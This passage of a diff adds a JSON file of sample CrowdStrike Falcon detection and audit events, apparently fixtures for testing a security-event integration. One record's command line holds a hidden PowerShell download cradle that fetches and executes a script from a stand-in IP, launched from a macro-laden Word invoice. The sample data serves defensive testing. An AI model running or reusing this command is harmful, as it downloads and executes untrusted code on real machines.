@@ -1,0 +1,1102 @@
+[
+  {
+    "detection_id": "cs-1",
+    "created_timestamp": "2026-09-20T10:00:00Z",
+    "max_severity_displayname": "High",
+    "tactic": "Credential Access",
+    "description": "Credential dumping attempt blocked",
+    "name": "CredentialTheft",
+    "user_name": "jdoe",
+    "user_id": "S-1-5-21",
+    "local_ip": "10.1.2.3",
+    "hostname": "laptop-17",
+    "device_id": "dev-1",
+    "status": "new"
+  },
+  {
+    "composite_id": "ldt:8a1c7b6e5d40:ind:99887766",
+    "created_timestamp": "2026-09-20T11:10:00.123456789Z",
+    "updated_timestamp": "2026-09-20T11:11:00.000000000Z",
+    "severity": 80,
+    "severity_name": "High",
+    "confidence": 90,
+    "tactic": "Credential Access",
+    "technique": "OS Credential Dumping",
+    "pattern_id": 99887766,
+    "display_name": "CredentialDumpingViaLsass",
+    "description": "A process read memory from lsass.exe",
+    "status": "new",
+    "user_name": "marc",
+    "user_id": "S-1-5-21-1004",
+    "product": "epp",
+    "device": {
+      "device_id": "8a1c7b6e5d40",
+      "hostname": "laptop-21",
+      "local_ip": "10.1.2.9",
+      "external_ip": "203.0.113.90",
+      "platform_name": "Windows"
+    }
+  },
+  {
+    "composite_id": "1111aaaa2222bbbb3333cccc4444dddd:ind:5d40e8a1c7b6:4400771-10302-55443322",
+    "aggregate_id": "aggind:5d40e8a1c7b6:4400771",
+    "cid": "1111aaaa2222bbbb3333cccc4444dddd",
+    "agent_id": "5d40e8a1c7b6",
+    "created_timestamp": "2026-09-21T08:14:02.512338711Z",
+    "updated_timestamp": "2026-09-21T08:14:05.000000000Z",
+    "timestamp": "2026-09-21T08:13:58.902Z",
+    "product": "epp",
+    "type": "ldt",
+    "platform": "Windows",
+    "severity": 70,
+    "severity_name": "High",
+    "confidence": 80,
+    "status": "new",
+    "pattern_id": 10302,
+    "tactic": "Execution",
+    "tactic_id": "TA0002",
+    "technique": "PowerShell",
+    "technique_id": "T1059.001",
+    "objective": "Follow Through",
+    "scenario": "suspicious_activity",
+    "display_name": "PowerShellDownloadCradle",
+    "name": "PowerShellDownloadCradle",
+    "description": "A PowerShell process downloaded and ran a remote script.",
+    "pattern_disposition_description": "Detection, standard detection.",
+    "filename": "powershell.exe",
+    "filepath": "\\Device\\HarddiskVolume3\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "cmdline": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/a.ps1')\"",
+    "sha256": "de96a6e69944335375dc1ac238336066889d9ffc7d73628ef4fe1b1b160ab32c",
+    "md5": "7353f60b1739074eb17c5f4dddefe239",
+    "local_process_id": "6120",
+    "process_id": "88123456789",
+    "user_name": "j.doe",
+    "user_id": "S-1-5-21-1111111111-2222222222-3333333333-1104",
+    "logon_domain": "EXAMPLE",
+    "parent_details": {
+      "filename": "WINWORD.EXE",
+      "filepath": "\\Device\\HarddiskVolume3\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+      "cmdline": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\j.doe\\Downloads\\invoice.docm\"",
+      "local_process_id": "4480",
+      "process_id": "88123450001",
+      "sha256": "4f6c5b8e5d7a1c3b9e2f0a1d4c6b8e7f5a3c1e9d7b5a3f1e0c2d4b6a8f9e7d5c",
+      "user_name": "j.doe"
+    },
+    "grandparent_details": {
+      "filename": "explorer.exe",
+      "filepath": "\\Device\\HarddiskVolume3\\Windows\\explorer.exe",
+      "cmdline": "C:\\Windows\\Explorer.EXE"
+    },
+    "falcon_host_link": "https://falcon.eu-1.crowdstrike.com/activity-v2/detections/1111aaaa2222bbbb3333cccc4444dddd:ind:5d40e8a1c7b6:4400771-10302-55443322",
+    "device": {
+      "device_id": "5d40e8a1c7b6",
+      "hostname": "laptop-33",
+      "local_ip": "10.1.2.33",
+      "external_ip": "203.0.113.41",
+      "mac_address": "02-00-00-00-00-21",
+      "machine_domain": "corp.example.org",
+      "os_version": "Windows 11",
+      "platform_name": "Windows"
+    }
+  },
+  {
+    "composite_id": "1111aaaa2222bbbb3333cccc4444dddd:ind:1111aaaa2222bbbb3333cccc4444dddd:7c1e4f2a-0b3d-4e5f-8a6b-9c0d1e2f3a4b",
+    "cid": "1111aaaa2222bbbb3333cccc4444dddd",
+    "created_timestamp": "2026-09-21T09:02:11.000Z",
+    "timestamp": "2026-09-21T09:01:40.000Z",
+    "product": "idp",
+    "type": "idp-user-endpoint-app-access",
+    "severity": 50,
+    "severity_name": "Medium",
+    "status": "new",
+    "pattern_id": 51135,
+    "tactic": "Initial Access",
+    "technique": "Valid Accounts",
+    "display_name": "Unusual login to an endpoint",
+    "description": "A user logged in to a machine for the first time",
+    "source_account_name": "m.martin",
+    "source_account_upn": "m.martin@example.org",
+    "source_account_domain": "EXAMPLE.ORG",
+    "source_account_object_sid": "S-1-5-21-1111111111-2222222222-3333333333-1201",
+    "source_endpoint_host_name": "ws-12.corp.example.org",
+    "source_endpoint_ip_address": "10.1.4.12",
+    "source_endpoint_sensor_id": "9e8d7c6b5a40",
+    "target_endpoint_host_name": "fileserver-01",
+    "target_service_access_identifier": "cifs/fileserver-01"
+  },
+  {
+    "metadata": {
+      "customerIDString": "44be50f58ccfcfcfcfcfcfcfcffc",
+      "offset": 111111,
+      "eventType": "DetectionSummaryEvent",
+      "eventCreationTime": 1682930000000,
+      "version": "1.0"
+    },
+    "event": {
+      "ProcessStartTime": 1682930000000,
+      "ProcessEndTime": 1682930000000,
+      "ProcessId": 1682930000000,
+      "ParentProcessId": 1682930000000,
+      "ComputerName": "example.com",
+      "UserName": "Username",
+      "DetectName": "DetectName",
+      "DetectDescription": "This file meets the Adware/PUP Anti-malware ML algorithms high-confidence threshold.",
+      "Severity": 2,
+      "SeverityName": "Low",
+      "FileName": "Setup_test.exe",
+      "FilePath": "\\Device\\Downloads",
+      "CommandLine": "\"C:\\Setup_test.exe\" ",
+      "SHA256String": "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b",
+      "MD5String": "68b329da9893e34099c7d8ad5cb9c940",
+      "SHA1String": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
+      "MachineDomain": "AD",
+      "FalconHostLink": "https://test.com/activity/",
+      "SensorId": "c9794942866f428",
+      "IOCType": "hash_sha256",
+      "IOCValue": "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b",
+      "DetectId": "ldt:c9794942866f:26628996",
+      "QuarantineFiles": [
+        {
+          "ImageFileName": "\\Device\\Setup_test.exe",
+          "SHA256HashData": "76da317a8e17b7d773f09e"
+        }
+      ],
+      "LocalIP": "192.0.2.10",
+      "MACAddress": "02:00:00:00:00:00",
+      "Tactic": "Machine Learning",
+      "Technique": "Adware/PUP",
+      "Objective": "Falcon Detection Method",
+      "PatternDispositionDescription": "Prevention/Quarantine, process was blocked from execution and quarantine was attempted.",
+      "PatternDispositionValue": 2222,
+      "PatternDispositionFlags": {
+        "Indicator": false,
+        "Detect": false,
+        "InddetMask": false,
+        "SensorOnly": false,
+        "Rooting": false,
+        "KillProcess": false,
+        "KillSubProcess": false,
+        "QuarantineMachine": false,
+        "QuarantineFile": true,
+        "PolicyDisabled": false,
+        "KillParent": false,
+        "OperationBlocked": false,
+        "ProcessBlocked": true,
+        "RegistryOperationBlocked": false,
+        "CriticalProcessDisabled": false,
+        "BootupSafeguardEnabled": false,
+        "FsOperationBlocked": false,
+        "HandleOperationDowngraded": false,
+        "KillActionFailed": false,
+        "BlockingUnsupportedOrDisabled": false,
+        "SuspendProcess": false,
+        "SuspendParent": false
+      },
+      "ParentImageFileName": "\\Device\\test.exe",
+      "ParentCommandLine": "\"C:\\Program Files (x86)\\test.exe\" ",
+      "GrandparentImageFileName": "\\Device\\test.exe",
+      "GrandparentCommandLine": "test.exe",
+      "AssociatedFile": "\\Device\\test.exe",
+      "PatternId": 5555
+    }
+  },
+  {
+    "metadata": {
+      "customerIDString": "44be50f58ccfcfcfcfcfcfcfcffc",
+      "offset": 111111,
+      "eventType": "EppDetectionSummaryEvent",
+      "eventCreationTime": 1718032871000,
+      "version": "1.0"
+    },
+    "event": {
+      "ProcessStartTime": 1718032715,
+      "ProcessEndTime": 1718032715,
+      "ProcessId": 43009301133,
+      "ParentProcessId": 25841449898,
+      "Hostname": "example.com",
+      "UserName": "USER11111",
+      "Name": "NGAV",
+      "Description": "This file is classified as Adware/PUP based on its SHA256 hash.",
+      "Severity": 30,
+      "SeverityName": "Low",
+      "FileName": "rfusclient.exe",
+      "FilePath": "\\Device\\HarddiskVolume2\\Program Files (x86)\\RemoteTool\\rfusclient.exe",
+      "CommandLine": "\"C:\\Program Files (x86)\\RemoteTool\\rfusclient.exe\" /rsession",
+      "SHA256String": "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b",
+      "MD5String": "68b329da9893e34099c7d8ad5cb9c940",
+      "SHA1String": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
+      "LogonDomain": "EXAMPLE",
+      "FalconHostLink": "https://falcon.eu-1.crowdstrike.com/activity-v2/detections/44be50f58ccfcfcfcfcfcfcfcffc:ind:c8d1292a8a904216aa25ab728f4b45fd:11111111111-2222-3333333?_cid=99999999999999999999999999999999",
+      "AgentId": "c8d1292a8a904216aa25ab728f4b45fd",
+      "IOCType": "hash_sha256",
+      "IOCValue": "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b",
+      "CompositeId": "44be50f58ccfcfcfcfcfcfcfcffc:ind:c8d1292a8a904216aa25ab728f4b45fd:11111111111-2222-3333333",
+      "LocalIP": "192.0.2.10",
+      "MACAddress": "02:00:00:00:00:00",
+      "Tactic": "Malware",
+      "Technique": "PUP",
+      "Objective": "Falcon Detection Method",
+      "PatternDispositionDescription": "Prevention, process was blocked from execution.",
+      "PatternDispositionValue": 2048,
+      "PatternDispositionFlags": {
+        "Indicator": false,
+        "Detect": false,
+        "InddetMask": false,
+        "SensorOnly": false,
+        "Rooting": false,
+        "KillProcess": false,
+        "KillSubProcess": false,
+        "QuarantineMachine": false,
+        "QuarantineFile": false,
+        "PolicyDisabled": false,
+        "KillParent": false,
+        "OperationBlocked": false,
+        "ProcessBlocked": true,
+        "RegistryOperationBlocked": false,
+        "CriticalProcessDisabled": false,
+        "BootupSafeguardEnabled": false,
+        "FsOperationBlocked": false,
+        "HandleOperationDowngraded": false,
+        "KillActionFailed": false,
+        "BlockingUnsupportedOrDisabled": false,
+        "SuspendProcess": false,
+        "SuspendParent": false
+      },
+      "ParentImageFileName": "rutserv.exe",
+      "ParentCommandLine": "\"C:\\Program Files (x86)\\RemoteTool\\rutserv.exe\"",
+      "GrandParentImageFileName": "services.exe",
+      "GrandParentCommandLine": "C:\\Windows\\system32\\services.exe",
+      "HostGroups": "ba7f8041fd6c47dcae4cff3194861088,c8d1292a8a904216aa25ab728f4b45fd",
+      "AssociatedFile": "\\Device\\HarddiskVolume2\\Program Files (x86)\\RemoteTool\\rfusclient.exe",
+      "PatternId": 5728,
+      "SourceVendors": "CrowdStrike",
+      "SourceProducts": "Falcon Insight",
+      "DataDomains": "Endpoint",
+      "AggregateId": "aggind:c8d1292a8a904216aa25ab728f4b45fd:21483417902",
+      "Type": "ldt",
+      "ParentImageFilePath": "\\Device\\HarddiskVolume2\\Program Files (x86)\\RemoteTool\\rutserv.exe",
+      "GrandParentImageFilePath": "\\Device\\HarddiskVolume2\\Windows\\System32\\services.exe",
+      "LocalIPv6": ""
+    }
+  },
+  {
+    "metadata": {
+      "customerIDString": "7da61e27e34f4b8394080000000",
+      "offset": 13950706,
+      "eventType": "EppDetectionSummaryEvent",
+      "eventCreationTime": 1723134750000,
+      "version": "1.0"
+    },
+    "event": {
+      "Hostname": "example.com",
+      "Name": "OnDemandScanfiletest",
+      "Severity": 70,
+      "FileName": "testfile.vmx",
+      "FilePath": "D:\\RECYCLER\\testpath\\testfile.vmx",
+      "SHA256String": "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b",
+      "FalconHostLink": "https://falcon.eu-1.crowdstrike.com/activity-v2/detections",
+      "AgentId": "1122025ec596478d830520000000000",
+      "CompositeId": "7da61e27e34f4b8394081896af72e2c7",
+      "LocalIP": "192.0.2.10",
+      "MACAddress": "02:00:00:00:00:00",
+      "Tactic": "Machine Learning",
+      "Technique": "Sensor-based ML",
+      "Objective": "Falcon Detection Method",
+      "HostGroups": "2a5927e82d644aa9,be74ccf2c2f444cf900",
+      "SourceVendors": "CrowdStrike",
+      "SourceProducts": "Falcon Insight",
+      "DataDomains": "Endpoint",
+      "Type": "ods",
+      "LocalIPv6": ""
+    }
+  },
+  {
+    "metadata": {
+      "customerIDString": "11111111111111111111111111111111",
+      "offset": 45665533,
+      "eventType": "IdpDetectionSummaryEvent",
+      "eventCreationTime": 1781898137000,
+      "version": "1.0"
+    },
+    "event": {
+      "ContextTimeStamp": 1781898075,
+      "FalconHostLink": "https://example.com/identity-protection/detections/11111111111111111111111111111111:ind:11111111111111111111111111111111:44444444-4444-4444-4444-444444444444?_cid=abcd",
+      "StartTime": 1781897922,
+      "EndTime": 1781897922,
+      "Severity": 10,
+      "SeverityName": "Informational",
+      "Tactic": "Initial Access",
+      "Technique": "Valid Accounts",
+      "Objective": "Gain Access",
+      "SourceAccountDomain": "EXAMPLE.ORG",
+      "SourceAccountName": "user2",
+      "SourceAccountUpn": "user2@example.com",
+      "SourceAccountObjectSid": "user1",
+      "SourceEndpointAccountObjectGuid": "44444444-4444-4444-4444-444444444444",
+      "SourceEndpointAccountObjectSid": "S-1-2-3",
+      "SourceEndpointHostName": "hostname.example.org",
+      "SourceEndpointIpAddress": "0.0.0.0",
+      "SourceEndpointSensorId": "11111111111111111111111111111111",
+      "TargetEndpointAccountObjectGuid": "22222222-2222-2222-2222-222222222222",
+      "TargetEndpointAccountObjectSid": "S-1-2-3-4",
+      "TargetEndpointHostName": "HOSTNAME",
+      "TargetServiceAccessIdentifier": "cifs/HOSTNAME",
+      "ActivityId": "44444444-4444-4444-4444-444444444444",
+      "PatternId": 51135,
+      "SourceVendors": "CrowdStrike",
+      "SourceProducts": "Falcon Identity Protection",
+      "DataDomains": "Identity",
+      "CompositeId": "11111111111111111111111111111111:ind:11111111111111111111111111111111:44444444-4444-4444-4444-444444444444",
+      "Name": "Unusual login to an endpoint",
+      "Description": "A user logged in to a machine for the first time",
+      "MitreAttack": [
+        {
+          "Tactic": "Initial Access",
+          "TacticID": "TA0001",
+          "Technique": "Valid Accounts",
+          "TechniqueID": "T1078",
+          "PatternID": 51135
+        }
+      ]
+    }
+  },
+  {
+    "metadata": {
+      "customerIDString": "46de5283260647ec8f28def00bffd094",
+      "offset": 39475,
+      "eventType": "IdentityProtectionEvent",
+      "eventCreationTime": 1691064196855,
+      "version": "1.0"
+    },
+    "event": {
+      "IncidentType": "UNUSUAL_ACTIVITY",
+      "IncidentDescription": "User access patterns detected as anomalous. Such activities may indicate potential threats such as endpoint infection, compromised account or other risks. Falcon monitors the activity and will escalate severity or incident type when necessary.",
+      "Severity": 1,
+      "SeverityName": "INFO",
+      "StartTime": 1691064195970,
+      "EndTime": 1691064196842,
+      "IdentityProtectionIncidentId": "INC-1036",
+      "UserName": "EXAMPLE.ORG\\JOHNDOE",
+      "EndpointName": "",
+      "EndpointIp": "",
+      "Category": "Incidents",
+      "NumbersOfAlerts": 1,
+      "NumberOfCompromisedEntities": 1,
+      "State": "NEW",
+      "FalconHostLink": "https://example.com/"
+    }
+  },
+  {
+    "metadata": {
+      "customerIDString": "0123456789ABCDEFGHIJKLMNOPQRSTUV",
+      "offset": 13896542,
+      "eventType": "MobileDetectionSummaryEvent",
+      "eventCreationTime": 1722754343000,
+      "version": "1.0"
+    },
+    "event": {
+      "SensorId": "85ae98xxxxxxd9a8f2",
+      "MobileDetectionId": 2,
+      "ComputerName": "example.com",
+      "UserName": "user1",
+      "ContextTimeStamp": 1722754273,
+      "DetectId": "0123456789ABCDEFGHIJKLMNOPQRSTUV:ind:85ae98xxxxxxd9a8f2:41104|2",
+      "DetectName": "CkbSensorDetectDomainHighUI",
+      "DetectDescription": "A domain lookup matched a CrowdStrike Intelligence indicator that has previously been used in targeted attacks.",
+      "Tactic": "Falcon Intel",
+      "TacticId": "CSTA0008",
+      "Technique": "Intelligence Indicator - Domain",
+      "TechniqueId": "CST0023",
+      "Objective": "Falcon Detection Method",
+      "Severity": 70,
+      "FalconHostLink": "https://example.com/",
+      "MobileNetworkConnections": [
+        {
+          "AccessTimestamp": 1722754273,
+          "Protocol": "6",
+          "ConnectionFlags": 0,
+          "LocalAddress": "",
+          "RemoteAddress": "192.0.2.10",
+          "RemotePort": 1,
+          "ConnectionDirection": 0,
+          "Url": "https://malicious.example.net/integration",
+          "IsIPV6": false,
+          "ContextProcessId": 17793441978049446000
+        }
+      ],
+      "ApplicationName": "com.example.browser",
+      "NetworkDetectionType": "prevented",
+      "SourceVendors": "CrowdStrike",
+      "SourceProducts": "Falcon for Mobile",
+      "DataDomains": "Endpoint",
+      "PatternId": 41124,
+      "CompositeId": "7da61e27e34f4b8394081896af72e2c7:ind:2250689c5d8e43ccad2f5a7b56bced5b:41124|2",
+      "Name": "CkbSensorDetectDomainHighUI",
+      "Description": "A domain lookup matched a CrowdStrike Intelligence indicator that has previously been used in targeted attacks."
+    }
+  },
+  {
+    "metadata": {
+      "customerIDString": "46de5283260647ec8f28def00bffd094",
+      "offset": 29294637,
+      "eventType": "XdrDetectionSummaryEvent",
+      "eventCreationTime": 1719310056000,
+      "version": "1.0"
+    },
+    "event": {
+      "DetectId": "46de5283260647ec8f28def00bffd094:ind:46de5283260647ec8f28def00bffd094:xdr|inc-675853ca01ec441df7a015b91a7e1272-11111111111111111111111111111111",
+      "Name": "azureuser on linux-vm",
+      "Description": "Techniques: Malicious File",
+      "PatternId": 199990,
+      "TacticIds": "CSTA0001",
+      "Tactics": "Malware",
+      "TechniqueIds": "CST0001",
+      "Techniques": "Malicious File",
+      "StartTimeEpoch": 1719309569000,
+      "EndTimeEpoch": 1719309874646,
+      "Severity": 16,
+      "SourceProducts": "Falcon",
+      "SourceVendors": "CrowdStrike",
+      "DataDomains": "Endpoint",
+      "Author": "CrowdStrike",
+      "XdrType": "xdr",
+      "SHA256Hashes": "29aa689f38158d2e8941fa54e436f0260890af31cecad1e8799e5c2df7bc1ecc",
+      "SensorIds": "675853ca01ec441df7a015b91a7e1272",
+      "CompositeId": "46de5283260647ec8f28def00bffd094:ind:46de5283260647ec8f28def00bffd094:xdr|inc-675853ca01ec441df7a015b91a7e1272-11111111111111111111111111111111"
+    }
+  },
+  {
+    "metadata": {
+      "customerIDString": "ee11cbb19052e40b07aac0ca060c23ee",
+      "offset": 48217,
+      "eventType": "IncidentSummaryEvent",
+      "eventCreationTime": 1756411262000,
+      "version": "1.0"
+    },
+    "event": {
+      "IncidentStartTime": 1756411177,
+      "IncidentEndTime": 1756411262,
+      "FalconHostLink": "https://example.com/",
+      "State": "open",
+      "FineScore": 0.3,
+      "LateralMovement": 0,
+      "IncidentType": 1,
+      "IncidentID": "ine:c4ca4238a0b923820dcc509a6f75849b:c81e728d9d4c2f636f067f89cc14862c",
+      "HostID": "HOSTID"
+    }
+  },
+  {
+    "metadata": {
+      "customerIDString": "1234567890abcdef1234567890abcdef",
+      "offset": 173116,
+      "eventType": "AutomatedLeadSummaryEvent",
+      "eventCreationTime": 1762354186000,
+      "version": "1.0"
+    },
+    "event": {
+      "LeadId": "abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890",
+      "Name": "EXAMPLE at 2025-11-05T14:49:40Z",
+      "SignalStartTimestamp": 1762354180,
+      "SignalEndTimestamp": 1762354181,
+      "SignalUpdatedTimestamp": 1762354181,
+      "Score": 54,
+      "ThreatgraphIndicators": [
+        {
+          "IndicatorId": "ind:1111111111111111111111111111111a:111111111111-10358-11111111",
+          "SignalAssociationTimestamp": 1762354180,
+          "PatternId": 10358,
+          "PatternDisposition": 0,
+          "Severity": 70,
+          "ProcessId": "111111111111",
+          "HostId": "1111111111111111111111111111111a",
+          "Hostname": "EXAMPLE",
+          "TemplateInstanceId": 24302,
+          "Description": "A user executed an unusual file. Adversaries can lure users into executing malicious code using spearphishing and other trickery. Review the executable and process tree.",
+          "DisplayName": "UserExecution"
+        },
+        {
+          "IndicatorId": "ind:1111111111111111111111111111111a:222222222222-10104-22222222",
+          "SignalAssociationTimestamp": 1762354181,
+          "PatternId": 10104,
+          "PatternDisposition": 0,
+          "Severity": 50,
+          "ProcessId": "222222222222",
+          "HostId": "1111111111111111111111111111111a",
+          "Hostname": "EXAMPLE",
+          "TemplateInstanceId": 2640,
+          "Description": "Mshta attempted to load a likely malicious command line from a registry entry using an obfuscated script. Review the script and registry key.",
+          "DisplayName": "SuspiciousMshta"
+        },
+        {
+          "IndicatorId": "ind:1111111111111111111111111111111a:333333333333-10107-33333333",
+          "SignalAssociationTimestamp": 1762354181,
+          "PatternId": 10107,
+          "PatternDisposition": 2048,
+          "Severity": 50,
+          "ProcessId": "333333333333",
+          "HostId": "1111111111111111111111111111111a",
+          "Hostname": "EXAMPLE",
+          "TemplateInstanceId": 1163,
+          "Description": "A PowerShell process downloaded and launched a remote file. This is often the result of a malicious macro designed to drop a variety of second stage payloads. Review the process tree.",
+          "DisplayName": "PShellDownload"
+        }
+      ],
+      "MitreAttack": [
+        {
+          "Tactic": "Execution",
+          "TacticID": "TA0002",
+          "Technique": "User Execution",
+          "TechniqueID": "T1204",
+          "PatternID": 10358
+        },
+        {
+          "Tactic": "Defense Evasion",
+          "TacticID": "TA0005",
+          "Technique": "Mshta",
+          "TechniqueID": "T1218.005",
+          "PatternID": 10104
+        },
+        {
+          "Tactic": "Execution",
+          "TacticID": "TA0002",
+          "Technique": "PowerShell",
+          "TechniqueID": "T1059.001",
+          "PatternID": 10107
+        }
+      ],
+      "LeadType": "simple",
+      "CompositeId": "1234567890abcdef1234567890abcdef:automated-lead:1234567890abcdef1234567890abcdef:abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890",
+      "FalconHostLink": "https://falcon.example.com/automated-leads/1234567890abcdef1234567890abcdef:automated-lead:1234567890abcdef1234567890abcdef:abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890?_cid=test1234567890abcdefghijklmnopqrs"
+    }
+  },
+  {
+    "metadata": {
+      "customerIDString": "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4",
+      "offset": 353590,
+      "eventType": "DataProtectionDetectionSummaryEvent",
+      "eventCreationTime": 1785268626000,
+      "version": "1.0"
+    },
+    "event": {
+      "AgentId": "3530c0e6e7c64558b5cc6401e1363e8e",
+      "CompositeId": "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4:data-protection:3530c0e6e7c64558b5cc6401e1363e8e:79e350e08abe11f1b16414b5cd5f7576",
+      "Name": "Test - All attempted to be uploaded to ExampleChat",
+      "Description": "testuser attempted to upload testfile.txt to ExampleChat",
+      "Tactic": "Exfiltration",
+      "TacticId": "TA0010",
+      "Technique": "Exfiltration Over Web Service",
+      "TechniqueId": "T1567",
+      "Severity": 50,
+      "SeverityName": "Medium",
+      "FalconHostLink": "https://falcon.example.com/data-protection/detections/detections-table/a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4:data-protection:3530c0e6e7c64558b5cc6401e1363e8e:79e350e08abe11f1b16414b5cd5f7576",
+      "Destination": {
+        "Channel": "web",
+        "Web": {
+          "ID": "015420a6be4d4f18bde6921bf0bb25f6",
+          "Name": "ExampleChat",
+          "Username": "user@example.com",
+          "URL": "https://example.com/",
+          "Hostname": "example.com",
+          "NormalizedURL": "example.com",
+          "WebCategoryID": "f12c2201c5d853b990bb600d14a751e8",
+          "WebCategoryName": "Generative AI"
+        }
+      },
+      "UserName": "testuser",
+      "UserSid": "User1",
+      "Hostname": "hostname",
+      "PatternId": 80005,
+      "DataVolume": 74,
+      "DetectionType": "rule-based",
+      "Platform": "Windows",
+      "MitreAttack": [
+        {
+          "Tactic": "Exfiltration",
+          "TacticID": "TA0010",
+          "Technique": "Exfiltration Over Web Service",
+          "TechniqueID": "T1567"
+        }
+      ],
+      "EgressEventId": "79e350e08abe11f1b16414b5cd5f7576",
+      "Policy": {
+        "ID": "6b415186ea6740ddb7efe9ab2174a767",
+        "Name": "DLP Demo Policy"
+      },
+      "MatchedClassification": {
+        "ID": "f28c05bf3c7e4794bddd0af134084756",
+        "Name": "Test - All"
+      },
+      "UserNotified": true,
+      "ResponseAction": "blocked",
+      "RuleId": "35157af4b06a43d38d9710041f5ec11e",
+      "IsClipboard": false,
+      "Filename": "testfile.txt",
+      "EventTimestamp": 1785268624
+    }
+  },
+  {
+    "metadata": {
+      "customerIDString": "46de5283260647ec8f28def00bffd094",
+      "offset": 6755,
+      "eventType": "AuthActivityAuditEvent",
+      "eventCreationTime": 1657663146099,
+      "version": "1.0"
+    },
+    "event": {
+      "UserId": "user1",
+      "UserIp": "192.0.2.1",
+      "OperationName": "twoFactorAuthenticate",
+      "ServiceName": "CrowdStrike Authentication",
+      "Success": true,
+      "UTCTimestamp": 1657663146099
+    }
+  },
+  {
+    "metadata": {
+      "customerIDString": "46de5283260647ec8f28def00bffd094",
+      "offset": 174,
+      "eventType": "AuthActivityAuditEvent",
+      "eventCreationTime": 1657110865303,
+      "version": "1.0"
+    },
+    "event": {
+      "UserId": "user1",
+      "UserIp": "192.0.2.1",
+      "OperationName": "streamStarted",
+      "ServiceName": "Crowdstrike Streaming API",
+      "Success": true,
+      "UTCTimestamp": 1657110865,
+      "AuditKeyValues": [
+        {
+          "Key": "partition",
+          "ValueString": "0"
+        },
+        {
+          "Key": "offset",
+          "ValueString": "-1"
+        },
+        {
+          "Key": "appId",
+          "ValueString": "app-00000"
+        },
+        {
+          "Key": "eventType",
+          "ValueString": "All event type(s)"
+        },
+        {
+          "Key": "APIClientID",
+          "ValueString": "00000000000000000000000000000000"
+        }
+      ]
+    }
+  },
+  {
+    "metadata": {
+      "customerIDString": "46de5283260647ec8f28def00bffd094",
+      "offset": 747,
+      "eventType": "UserActivityAuditEvent",
+      "eventCreationTime": 1657614940000,
+      "version": "1.0"
+    },
+    "event": {
+      "UserId": "user1",
+      "UserIp": "192.0.2.1",
+      "OperationName": "detection_update",
+      "ServiceName": "detections",
+      "AuditKeyValues": [
+        {
+          "Key": "detection_id",
+          "ValueString": "ldt:5418788591a444d1b45c2b39d3b07b50:21482411386"
+        },
+        {
+          "Key": "new_state",
+          "ValueString": "closed"
+        },
+        {
+          "Key": "assigned_to",
+          "ValueString": "Foo Bar"
+        },
+        {
+          "Key": "assigned_to_uid",
+          "ValueString": "user1"
+        }
+      ],
+      "UTCTimestamp": 1657614940
+    }
+  },
+  {
+    "metadata": {
+      "customerIDString": "XXX",
+      "offset": 570941,
+      "eventType": "APIActivityAuditEvent",
+      "eventCreationTime": 1750935017037,
+      "version": "1.0"
+    },
+    "event": {
+      "UserId": "",
+      "UserIp": "192.0.2.10",
+      "OperationName": "logged",
+      "ServiceName": "api_request",
+      "Success": true,
+      "UTCTimestamp": 1750935017,
+      "Attributes": {
+        "APIClientID": "XXX",
+        "cid": "11111111111111111111111111111111",
+        "consumes": "[application/json]",
+        "elapsed_microseconds": "87719",
+        "elapsed_time": "87.719978ms",
+        "produces": "[application/json]",
+        "received_time": "2025-06-26T10:50:16.950073741Z",
+        "request_accept": "*/*",
+        "request_content_type": "application/json",
+        "request_method": "POST",
+        "request_path": "/path/to/something/v1/0",
+        "request_query": "https://example.com/",
+        "request_uri_length": "110",
+        "scopes": "streaming:read",
+        "status_code": "404",
+        "trace_id": "11111111-1111-1111-1111-111111111111",
+        "user_agent": "siem-connector/1.0",
+        "user_ip": "192.0.2.10"
+      },
+      "Message": "",
+      "Source": "api_request",
+      "SourceIp": "192.0.2.10",
+      "AuditKeyValues": [
+        {
+          "Key": "trace_id",
+          "ValueString": "11111111-1111-1111-1111-111111111111"
+        },
+        {
+          "Key": "APIClientID",
+          "ValueString": "XXX"
+        },
+        {
+          "Key": "consumes",
+          "ValueString": "[application/json]"
+        },
+        {
+          "Key": "elapsed_microseconds",
+          "ValueString": "87719"
+        },
+        {
+          "Key": "cid",
+          "ValueString": "11111111111111111111111111111111"
+        },
+        {
+          "Key": "produces",
+          "ValueString": "[application/json]"
+        },
+        {
+          "Key": "request_uri_length",
+          "ValueString": "110"
+        },
+        {
+          "Key": "user_agent",
+          "ValueString": "siem-connector/1.0"
+        },
+        {
+          "Key": "received_time",
+          "ValueString": "2025-06-26T10:50:16.950073741Z"
+        },
+        {
+          "Key": "request_method",
+          "ValueString": "POST"
+        },
+        {
+          "Key": "status_code",
+          "ValueString": "404"
+        },
+        {
+          "Key": "request_query",
+          "ValueString": "https://example.com/"
+        },
+        {
+          "Key": "request_accept",
+          "ValueString": "*/*"
+        },
+        {
+          "Key": "request_content_type",
+          "ValueString": "application/json"
+        },
+        {
+          "Key": "request_path",
+          "ValueString": "/path/to/something/v1/0"
+        },
+        {
+          "Key": "scopes",
+          "ValueString": "streaming:read"
+        },
+        {
+          "Key": "user_ip",
+          "ValueString": "192.0.2.10"
+        },
+        {
+          "Key": "elapsed_time",
+          "ValueString": "87.719978ms"
+        }
+      ]
+    }
+  },
+  {
+    "metadata": {
+      "customerIDString": "46de5283260647ec8f28def00bffd094",
+      "offset": 29294067,
+      "eventType": "ScheduledReportNotificationEvent",
+      "eventCreationTime": 1719291609000,
+      "version": "1.0"
+    },
+    "event": {
+      "UserUUID": "user1",
+      "UserID": "user1",
+      "ExecutionID": "68b329da9893e34099c7d8ad5cb9c940",
